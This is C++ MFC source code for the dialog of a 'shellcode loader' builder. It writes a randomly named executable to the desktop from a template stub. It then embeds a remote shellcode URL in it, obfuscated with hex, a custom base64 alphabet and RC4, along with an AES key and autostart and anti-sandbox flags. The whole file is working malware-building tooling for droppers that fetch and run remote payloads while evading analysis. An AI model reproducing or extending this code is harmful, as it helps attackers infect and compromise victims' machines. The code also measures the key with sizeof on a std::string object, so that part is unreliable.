
// shellcodeLoaderDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "shellcodeLoader.h"
#include "shellcodeLoaderDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CshellcodeLoaderDlg 对话框



CshellcodeLoaderDlg::CshellcodeLoaderDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_SHELLCODELOADER_DIALOG, pParent)
	, ShellcodePath(_T(""))
	, bool_x64(FALSE)
	, bool_autofish(FALSE)
	, bool_antisandbox(FALSE)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CshellcodeLoaderDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_PATH, ShellcodePath);
	DDV_MaxChars(pDX, ShellcodePath, 255);
	DDX_Text(pDX, IDC_PATH2, AESKey);
	DDV_MaxChars(pDX, AESKey, 255);
	DDX_Check(pDX, IDC_X64, bool_x64);
	DDX_Check(pDX, IDC_AUTOSTART, bool_autofish);
	DDX_Check(pDX, IDC_ANTISANDBOX, bool_antisandbox);
	DDX_Control(pDX, IDC_METHOD, Method);
}

BEGIN_MESSAGE_MAP(CshellcodeLoaderDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_DROPFILES()
	ON_BN_CLICKED(IDC_GENERATE, &CshellcodeLoaderDlg::OnBnClickedGenerate)
	ON_BN_CLICKED(IDC_X64, &CshellcodeLoaderDlg::OnBnClickedX64)
END_MESSAGE_MAP()



BOOL CshellcodeLoaderDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	SetIcon(m_hIcon, TRUE);			
	SetIcon(m_hIcon, FALSE);	
	WIN32_FIND_DATA wfd = { 0 };
	HANDLE fhnd = FindFirstFile(_T("DATA\\32\\*.DAT"), &wfd);
	if (fhnd == INVALID_HANDLE_VALUE)
	{
		FindClose(fhnd);
		return TRUE;
	}
	BOOL bRet = TRUE;
	while (bRet)
	{
		CString filename = wfd.cFileName;
		Method.AddString(filename.Left(filename.ReverseFind(_T('.'))));
		bRet = FindNextFile(fhnd, &wfd);
	}
	FindClose(fhnd);
	Method.SetCurSel(0);
	return TRUE; 
}



void CshellcodeLoaderDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); 
		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

HCURSOR CshellcodeLoaderDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CshellcodeLoaderDlg::StreamCrypt(unsigned char* Data, unsigned long Length, unsigned char* Key, unsigned long KeyLength)
{
	int i = 0, j = 0;
	unsigned char k[256] = { 0 }, s[256] = { 0 };
	unsigned char tmp = 0;
	for (i = 0; i < 256; i++)
	{
		s[i] = i;
		k[i] = Key[i%KeyLength];
	}
	for (i = 0; i < 256; i++)
	{
		j = (j + s[i] + k[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
	}
	int t = 0;
	i = 0, j = 0, tmp = 0;
	unsigned long l = 0;
	for (l = 0; l < Length; l++)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
		t = (s[i] + s[j]) % 256;
		Data[l] ^= s[t];
	}
}

std::string CshellcodeLoaderDlg::hex_encode(const std::vector<unsigned char>& input)
{
	std::stringstream encoded_stream;
	encoded_stream << std::hex << std::setfill('0');

	for (unsigned char c : input)
	{
		encoded_stream << std::setw(2) << static_cast<unsigned int>(c);
	}

	return encoded_stream.str();
}

std::string CshellcodeLoaderDlg::base64Encode(const std::string& input)
{
	const std::string base64Chars = "i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN";

	std::string output;
	int val = 0;
	int valBits = 0;

	for (const auto& c : input) {
		val = (val << 8) | static_cast<unsigned char>(c);
		valBits += 8;

		while (valBits >= 6) {
			valBits -= 6;
			output += base64Chars[(val >> valBits) & 0x3F];
		}
	}

	if (valBits > 0) {
		val <<= (6 - valBits);
		output += base64Chars[val & 0x3F];

		int padding = (6 - valBits) / 2;
		for (int i = 0; i < padding; ++i) {
			output += '=';
		}
	}

	return output;
}

void CshellcodeLoaderDlg::OnBnClickedGenerate()
{

	UpdateData(TRUE);
	if (ShellcodePath.IsEmpty())
	{
		AfxMessageBox(_T("Please drag in a shellcode Url"));
		return;
	}

	if (AESKey.IsEmpty())
	{
		AfxMessageBox(_T("Please drag in a AES Key"));
		return;
	}

	CONFIG config = { 0 };
	config.autofish = bool_autofish;
	config.antisandbox = bool_antisandbox;
	srand(time(0));
	for (int i = 0; i < 128; i++)
	{
		memset(&config.key[i], rand() % 0xFF, 1);
	}
	CString method,srcpath;
	Method.GetWindowTextW(method);
	if (bool_x64)
	{
		srcpath = _T("DATA\\64\\") + method + _T(".DAT");
	}
	else
	{
		srcpath= _T("DATA\\32\\") + method + _T(".DAT");
	}
	wchar_t filepath[MAX_PATH] = { 0 };
	SHGetSpecialFolderPath(0, filepath, CSIDL_DESKTOPDIRECTORY, 0);
	
	std::random_device rd;
	std::mt19937 gen(rd());
	int minNumber = 1;
	int maxNumber = 100;
	std::uniform_int_distribution<int> dist(minNumber, maxNumber);
	int randomNumber = dist(gen);
	std::string filename = "\\sovha" + std::to_string(randomNumber) + ".exe";
	std::wstring wideFilename(filename.begin(), filename.end());
	StrCatW(filepath, wideFilename.c_str());

	if (CopyFile(srcpath,filepath,FALSE)==0)
	{
		AfxMessageBox(_T("Build loader failed"));
		return;
	}

	//URL加密
	std::string url(CW2A(ShellcodePath.GetString()));
	std::vector<unsigned char> binaryArray(url.begin(), url.end());
	std::string encoded_string = base64Encode(hex_encode(binaryArray));

	std::string aeskey(CW2A(AESKey.GetString()));

	//开辟缓冲区
	int shellcodeSize = encoded_string.length();
	PBYTE shellcode = (PBYTE)malloc(shellcodeSize + sizeof(config) + sizeof(aeskey));

	//开头是config设置代码
	memcpy(shellcode, &config, sizeof(config));

	//其次是AES Key
	memcpy(shellcode + sizeof(config), aeskey.c_str(), sizeof(aeskey));

	//最后是加密后的URL进缓冲区
	memcpy(shellcode + sizeof(config) + sizeof(aeskey), encoded_string.c_str(), shellcodeSize);

	StreamCrypt(shellcode + sizeof(CONFIG) + +sizeof(aeskey), shellcodeSize, config.key,128);
	HANDLE  hResource = BeginUpdateResource(filepath, FALSE);
	if (NULL != hResource)
	{
		if (UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(100), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)shellcode, shellcodeSize + sizeof(config) + sizeof(aeskey)) != FALSE)
		{
			AfxMessageBox(_T("Generated successfully"));
			EndUpdateResource(hResource, FALSE);
		}
	}
	free(shellcode);
	//CloseHandle(hShellcode);
	return;
}


void CshellcodeLoaderDlg::OnDropFiles(HDROP hDropInfo)
{
	wchar_t pFilePath[256] = { 0 };
	DragQueryFile(hDropInfo, 0, pFilePath, 256);
	ShellcodePath.Format(_T("%s"), pFilePath);
	UpdateData(false);
	CDialogEx::OnDropFiles(hDropInfo);
}


void CshellcodeLoaderDlg::OnBnClickedX64()
{
	UpdateData(TRUE);
	Method.ResetContent();
	WIN32_FIND_DATA wfd = { 0 };
	HANDLE fhnd = INVALID_HANDLE_VALUE;
	if (bool_x64)
	{
		fhnd = FindFirstFile(_T("DATA\\64\\*.DAT"), &wfd);
	}
	else
	{
		fhnd = FindFirstFile(_T("DATA\\32\\*.DAT"), &wfd);
	}
	if (fhnd == INVALID_HANDLE_VALUE)
	{
		FindClose(fhnd);
		return;
	}
	BOOL bRet = TRUE;
	while (bRet)
	{
		CString filename = wfd.cFileName;
		Method.AddString(filename.Left(filename.ReverseFind(_T('.'))));
		bRet = FindNextFile(fhnd, &wfd);
	}
	FindClose(fhnd);
	Method.SetCurSel(0);
}
